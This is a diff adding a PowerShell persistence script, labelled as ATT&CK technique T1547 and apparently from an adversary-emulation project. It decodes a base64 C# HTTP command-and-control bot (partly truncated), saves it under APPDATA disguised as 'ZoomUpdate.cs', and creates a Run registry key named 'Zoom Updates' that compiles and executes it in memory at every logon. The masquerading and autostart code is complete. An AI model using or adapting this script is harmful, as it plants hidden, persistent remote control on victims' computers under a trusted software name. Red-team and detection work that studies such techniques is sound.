@@ -1,0 +1,32 @@
+# T1547 - Boot or Logon Autostart
+# On boot reads a regkey to use powershell to compile cs and then execute in memory
+# Base64 has been truncated in this example
+
+# This powershell script prepares the Run Key to execute powershell on boot and
+# then execute the cs HTTP C2 that is base64 encoded below and saved in 
+# APPDATA under Roaming/Microsoft/ZoomUpdates.cs
+
+# Code was taken from the below and modified...
+# https://raw.githubusercontent.com/thepcn3rd/simpleC2v3/master/v9Get.cs
+
+$path = $env:APPDATA + "\Microsoft"
+$fileDestination = $path + "\ZoomUpdate.cs"
+# Used linux to build the base64 file
+# unix2dos code.cs   # Changes the line return to be a 0a0d instead of just a 0a
+# cat code.cs | base64 > code.b64
+# cat code.b64 | sed 's/^/$b64 += "/' | sed 's/$/"/'
+# Remove on the first line below the + sign...
+$b64 = "dXNpbmcgU3lzdGVtOyAgDQp1c2luZyBTeXN0ZW0uSU87ICANCnVzaW5nIFN5c3RlbS5OZXQ7DQp1"
+$b64 += "c2luZyBTeXN0ZW0uVGV4dDsgIA0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KdXNpbmcgU3lz"
+..
+$b64 += "DQoJCQkJVGhyZWFkLlNsZWVwKDMwMDAwKTsgIC8vIDMwIFNlY29uZHMNCgkJCX0NCgkJfQ0KICAg"
+$b64 += "ICAgICB9ICANCiAgIH0NCn0NCg0K"
+
+[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($b64)) | Out-File -Encoding ASCII $fileDestination 
+
+$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+# powershell.exe -c "Add-Type -Path $($path)\ZoomUpdate.cs; (New-Object MyWebBot.myWebBot).Main()"
+$execString = "powershell.exe -c `"Add-Type -Path $($path)\ZoomUpdate.cs; (New-Object MyWebBot.myWebBot).Main()`""
+
+# Create the RunKey
+Set-ItemProperty $runKey "Zoom Updates" $execString
